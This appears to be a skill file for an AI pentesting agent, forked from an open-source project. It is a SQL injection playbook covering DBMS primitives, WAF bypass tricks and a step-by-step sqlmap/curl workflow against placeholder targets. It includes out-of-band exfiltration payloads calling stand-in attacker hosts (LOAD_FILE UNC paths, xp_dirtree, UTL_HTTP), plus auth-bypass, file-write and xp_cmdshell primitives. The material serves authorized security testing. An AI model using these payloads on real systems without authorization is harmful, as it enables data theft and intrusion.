<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: sql-injection
description: SQL injection testing covering union, blind, error-based, and ORM bypass techniques
---

# SQL Injection

SQLi remains one of the most durable and impactful vulnerability classes. Modern exploitation focuses on parser differentials, ORM/query-builder edges, JSON/XML/CTE/JSONB surfaces, out-of-band exfiltration, and subtle blind channels. Treat every string concatenation into SQL as suspect.

## Attack Surface

**Databases**
- Classic relational: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
- Newer surfaces: JSON/JSONB operators, full-text/search, geospatial, window functions, CTEs, lateral joins

**Integration Paths**
- ORMs, query builders, stored procedures
- Search servers, reporting/exporters

**Input Locations**
- Path/query/body/header/cookie
- Mixed encodings (URL, JSON, XML, multipart)
- Identifier vs value: table/column names (require quoting/escaping) vs literals (quotes/CAST requirements)
- Query builders: `whereRaw`/`orderByRaw`, string templates in ORMs
- JSON coercion or array containment operators
- Batch/bulk endpoints and report generators that embed filters directly

## Detection Channels

**Error-Based**
- Provoke type/constraint/parser errors revealing stack/version/paths

**Boolean-Based**
- Pair requests differing only in predicate truth
- Diff status/body/length/ETag

**Time-Based**
- `SLEEP`/`pg_sleep`/`WAITFOR`
- Use subselect gating to avoid global latency noise

**Out-of-Band (OAST)**
- DNS/HTTP callbacks via DB-specific primitives

## DBMS Primitives

### MySQL

- Version/user/db: `@@version`, `database()`, `user()`, `current_user()`
- Error-based: `extractvalue()`/`updatexml()` (older), JSON functions for error shaping
- File IO: `LOAD_FILE()`, `SELECT ... INTO DUMPFILE/OUTFILE` (requires FILE privilege, secure_file_priv)
- OOB/DNS: `LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))`
- Time: `SLEEP(n)`, `BENCHMARK`
- JSON: `JSON_EXTRACT`/`JSON_SEARCH` with crafted paths; GIS funcs sometimes leak

### PostgreSQL

- Version/user/db: `version()`, `current_user`, `current_database()`
- Error-based: raise exception via unsupported casts or division by zero; `xpath()` errors in xml2
- OOB: `COPY (program ...)` or dblink/foreign data wrappers (when enabled); http extensions
- Time: `pg_sleep(n)`
- Files: `COPY table TO/FROM '/path'` (requires superuser), `lo_import`/`lo_export`
- JSON/JSONB: operators `->`, `->>`, `@>`, `?|` with lateral/CTE for blind extraction

### MSSQL

- Version/db/user: `@@version`, `db_name()`, `system_user`, `user_name()`
- OOB/DNS: `xp_dirtree`, `xp_fileexist`; HTTP via OLE automation (`sp_OACreate`) if enabled
- Exec: `xp_cmdshell` (often disabled), `OPENROWSET`/`OPENDATASOURCE`
- Time: `WAITFOR DELAY '0:0:5'`; heavy functions cause measurable delays
- Error-based: convert/parse, divide by zero, `FOR XML PATH` leaks

### Oracle

- Version/db/user: banner from `v$version`, `ora_database_name`, `user`
- OOB: `UTL_HTTP`/`DBMS_LDAP`/`UTL_INADDR`/`HTTPURITYPE` (permissions dependent)
- Time: `dbms_lock.sleep(n)`
- Error-based: `to_number`/`to_date` conversions, `XMLType`
- File: `UTL_FILE` with directory objects (privileged)

## Key Vulnerabilities

### UNION-Based Extraction

- Determine column count and types via `ORDER BY n` and `UNION SELECT null,...`
- Align types with `CAST`/`CONVERT`; coerce to text/json for rendering
- When UNION is filtered, switch to error-based or blind channels

### Blind Extraction

- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
- Binary search on character space for fewer requests
- Encode outputs (hex/base64) to normalize
- Gate delays inside subqueries to reduce noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`

### Out-of-Band

- Prefer OAST to minimize noise and bypass strict response paths
- Embed data in DNS labels or HTTP query params
- MSSQL: `xp_dirtree \\\\<data>.attacker.tld\\a`
- Oracle: `UTL_HTTP.REQUEST('http://<data>.attacker')`
- MySQL: `LOAD_FILE` with UNC path

### Write Primitives

- Auth bypass: inject OR-based tautologies or subselects into login checks
- Privilege changes: update role/plan/feature flags when UPDATE is injectable
- File write: `INTO OUTFILE`/`DUMPFILE`, `COPY TO`, `xp_cmdshell` redirection
- Job/proc abuse: schedule tasks or create procedures/functions when permissions allow

### ORM and Query Builders

- Dangerous APIs: `whereRaw`/`orderByRaw`, string interpolation into LIKE/IN/ORDER clauses
- Injections via identifier quoting (table/column names) when user input is interpolated into identifiers
- JSON containment operators exposed by ORMs (e.g., `@>` in PostgreSQL) with raw fragments
- Parameter mismatch: partial parameterization where operators or lists remain unbound (`IN (...)`)

### Uncommon Contexts

- ORDER BY/GROUP BY/HAVING with `CASE WHEN` for boolean channels
- LIMIT/OFFSET: inject into OFFSET to produce measurable timing or page shape
- Full-text/search helpers: `MATCH AGAINST`, `to_tsvector`/`to_tsquery` with payload mixing
- XML/JSON functions: error generation via malformed documents/paths

## Bypass Techniques

**Whitespace/Spacing**
- `/**/`, `/**/!00000`, comments, newlines, tabs
- `0xe3 0x80 0x80` (ideographic space)

**Keyword Splitting**
- `UN/**/ION`, `U%4eION`, backticks/quotes, case folding

**Numeric Tricks**
- Scientific notation, signed/unsigned, hex (`0x61646d696e`)

**Encodings**
- Double URL encoding, mixed Unicode normalizations (NFKC/NFD)
- `char()`/`CONCAT_ws` to build tokens

**Clause Relocation**
- Subselects, derived tables, CTEs (`WITH`), lateral joins to hide payload shape

## Testing Methodology

1. **Identify query shape** - SELECT/INSERT/UPDATE/DELETE, presence of WHERE/ORDER/GROUP/LIMIT/OFFSET
2. **Determine input influence** - User input in identifiers vs values
3. **Confirm injection class** - Reflective errors, boolean diffs, timing, or out-of-band callbacks
4. **Choose quietest oracle** - Prefer error-based or boolean over noisy time-based
5. **Establish extraction channel** - UNION (if visible), error-based, boolean bit extraction, time-based, or OAST/DNS
6. **Pivot to metadata** - version, current user, database name
7. **Target high-value tables** - auth bypass, role changes, filesystem access if feasible

## Validation

1. Show a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicates
2. Extract verifiable metadata (version, current user, database name) using the established channel
3. Retrieve or modify a non-trivial target (table rows, role flag) within legal scope
4. Provide reproducible requests that differ only in the injected fragment
5. Where applicable, demonstrate defense-in-depth bypass (WAF on, still exploitable via variant)

## False Positives

- Generic errors unrelated to SQL parsing or constraints
- Static response sizes due to templating rather than predicate truth
- Artificial delays from network/CPU unrelated to injected function calls
- Parameterized queries with no string concatenation, verified by code review

## Impact

- Direct data exfiltration and privacy/regulatory exposure
- Authentication and authorization bypass via manipulated predicates
- Server-side file access or command execution (platform/privilege dependent)
- Persistent supply-chain impact via modified data, jobs, or procedures

## Pro Tips

1. Pick the quietest reliable oracle first; avoid noisy long sleeps
2. Normalize responses (length/ETag/digest) to reduce variance when diffing
3. Aim for metadata then jump directly to business-critical tables; minimize lateral noise
4. When UNION fails, switch to error- or blind-based bit extraction; prefer OAST when available
5. Treat ORMs as thin wrappers: raw fragments often slip through; audit `whereRaw`/`orderByRaw`
6. Use CTEs/derived tables to smuggle expressions when filters block SELECT directly
7. Exploit JSON/JSONB operators in Postgres and JSON functions in MySQL for side channels
8. Keep payloads portable; maintain DBMS-specific dictionaries for functions and types
9. Validate mitigations with negative tests and code review; parameterize operators/lists correctly
10. Document exact query shapes; defenses must match how the query is constructed, not assumptions

## Concrete Testing Workflow (Step-by-Step Commands)

This is the mandatory execution sequence. Parameter discovery → manual probe → tool confirmation.
Do NOT run sqlmap/ghauri as the first step. Discovery comes first.

### PHASE A — Parameter Discovery (find injectable candidates)

  STEP A1: Extract SQLi candidate URLs from historical/crawled URL collections:
    cat output/urls_all_deduped.txt | gf sqli | sort -u > output/sqli_candidates.txt
    cat output/historical_urls.txt | gf sqli | sort -u >> output/sqli_candidates.txt
    # gf sqli pattern matches params like: id=, uid=, user_id=, order=, sort=, page=, ref=

  STEP A2: Discover hidden parameters on interesting endpoints using arjun:
    # Run AFTER identifying specific endpoints from recon (not on every URL)
    arjun -u "http://target.com/api/products" -o output/arjun_products.json --stable
    arjun -u "http://target.com/search" -m GET -o output/arjun_search.json --stable
    # arjun finds params the app accepts even if not shown in URL

  STEP A3: Hidden parameter discovery with x8 (faster, for wordlist-based probing):
    x8 -u "http://target.com/api/v1/user" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
       -o output/x8_user_params.txt
    x8 -u "http://target.com/search?q=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
       -o output/x8_search_params.txt

  STEP A4: Route all discovery traffic through Caido:
    arjun -u "http://target.com/api/products" --proxy http://127.0.0.1:48080 -o output/arjun_products.json
    x8 -u "http://target.com/search" --proxy http://127.0.0.1:48080 -o output/x8_search.txt
    # Caido captures all probe requests for later review

### PHASE B — Manual Probe (confirm before scanning)

  STEP B1: For each candidate parameter, send the three classic probes:
    # Single quote probe (syntax error?)
    curl -sk "http://target.com/search?q=test'" | grep -iE "error|sql|mysql|postgres|syntax|warning"

    # Boolean tautology vs contradiction (different response?)
    curl -sk "http://target.com/items?id=1 AND 1=1" > /tmp/true_response.txt
    curl -sk "http://target.com/items?id=1 AND 1=2" > /tmp/false_response.txt
    diff /tmp/true_response.txt /tmp/false_response.txt
    # If diff shows meaningful difference: strong SQLi signal

    # Time probe (DBMS-agnostic, start with short delay)
    time curl -sk "http://target.com/items?id=1; SELECT SLEEP(3)--" -o /dev/null
    # If response takes ≥3s longer: time-based SQLi confirmed

  STEP B2: Route probes through Caido to capture evidence:
    curl -sk -x http://127.0.0.1:48080 "http://target.com/search?q=test'" > /dev/null
    curl -sk -x http://127.0.0.1:48080 "http://target.com/items?id=1 AND 1=1" > /dev/null
    # Query Caido to compare responses:
    curl -sL -X POST http://127.0.0.1:48080/graphql \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer $TOKEN" \
      -d '{"query":"{ requests(filter: {host: {eq: \"target.com\"}, path: {cont: \"search\"}}) { edges { node { id path response { statusCode length } } } } }"}'

  STEP B3: Document confirmed signal before proceeding:
    # REQUIRED: Record in output/sqli_confirmed.txt:
    echo "TARGET: http://target.com/items?id=1" >> output/sqli_confirmed.txt
    echo "PARAM: id" >> output/sqli_confirmed.txt
    echo "SIGNAL: AND 1=1 vs AND 1=2 — response body length differs by 847 bytes" >> output/sqli_confirmed.txt
    echo "DBMS_GUESS: MySQL (SLEEP function responded)" >> output/sqli_confirmed.txt

### PHASE C — Tool-Assisted Exploitation (only after Phase B confirms a parameter)

  STEP C1: Run sqlmap on the confirmed parameter:
    sqlmap -u "http://target.com/items?id=1" \
      -p id \
      --batch --level=1 --risk=1 \
      --proxy http://127.0.0.1:48080 \
      --output-dir output/sqlmap/

    # If basic fails, escalate:
    sqlmap -u "http://target.com/items?id=1" \
      -p id \
      --batch --level=3 --risk=2 \
      --proxy http://127.0.0.1:48080 \
      --output-dir output/sqlmap/

  STEP C2: For POST body parameters:
    sqlmap -u "http://target.com/login" \
      --data "username=admin&password=test" \
      -p username \
      --batch --level=2 \
      --proxy http://127.0.0.1:48080 \
      --output-dir output/sqlmap/

  STEP C3: Use ghauri as WAF-evasive alternative:
    ghauri -u "http://target.com/items?id=1" \
      --dbs --batch \
      --proxy http://127.0.0.1:48080

  STEP C4: After confirmation, extract database metadata:
    sqlmap -u "<confirmed_injectable_url>" \
      --dbs --batch \
      --proxy http://127.0.0.1:48080 \
      --output-dir output/sqlmap/

### PHASE D — Verification and PoC Documentation

  STEP D1: Replay the confirmed injection in Caido to capture clean evidence:
    # Use Caido Replay to send the exact injection manually
    # This creates a clean, reproducible request/response pair as evidence

  STEP D2: Extract verifiable data (version, current user, database name):
    sqlmap -u "<confirmed_url>" \
      --current-user --current-db --hostname \
      --batch --proxy http://127.0.0.1:48080 \
      --output-dir output/sqlmap/
    # Document exact output in your report

  STEP D3: Construct impact-demonstrating PoC for the report:
    # For boolean-based blind: show the predicate toggle
    curl "http://target.com/items?id=1 AND 1=1" → [200, N bytes with content]
    curl "http://target.com/items?id=1 AND 1=2" → [200, M bytes empty/different]
    # Difference in bytes = the boolean oracle

  STEP D4: Only call create_vulnerability_report after:
    - sqlmap/ghauri confirms injection (not just manual probe)
    - At least one piece of verifiable data extracted (version, user, table name)
    - Exact URL, parameter, injection type, and extraction result documented
    - Reproducible curl command that demonstrates the behavioral difference

## Summary

Modern SQLi succeeds where authorization and query construction drift from assumptions. Bind parameters everywhere, avoid dynamic identifiers, and validate at the exact boundary where user input meets SQL.
